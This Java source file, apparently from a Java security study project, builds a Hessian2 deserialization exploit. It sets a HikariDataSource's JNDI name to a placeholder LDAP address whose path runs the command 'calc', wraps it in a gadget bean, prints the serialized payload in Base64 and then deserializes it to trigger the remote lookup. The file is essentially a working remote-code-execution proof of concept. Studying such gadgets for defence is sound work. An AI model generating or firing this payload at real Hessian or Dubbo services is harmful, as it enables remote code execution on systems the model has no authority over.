package com.example.javasec.hessian2;

import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.example.javasec.beans.Beans;
import com.zaxxer.hikari.HikariDataSource;

import java.io.*;
import java.util.Base64;

public class hessian1 {

    public static void main(String[] args) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HikariDataSource ds = new HikariDataSource();
        ds.setDataSourceJNDI("ldap://url:port/Basic/Command/calc");
        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
        Object o = new Beans(ds, HikariDataSource.class);
        out.writeString("aaa");
        out.writeObject(o);
        out.flushBuffer();
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream.toByteArray())));
        hessian2Input.readObject();
    }

}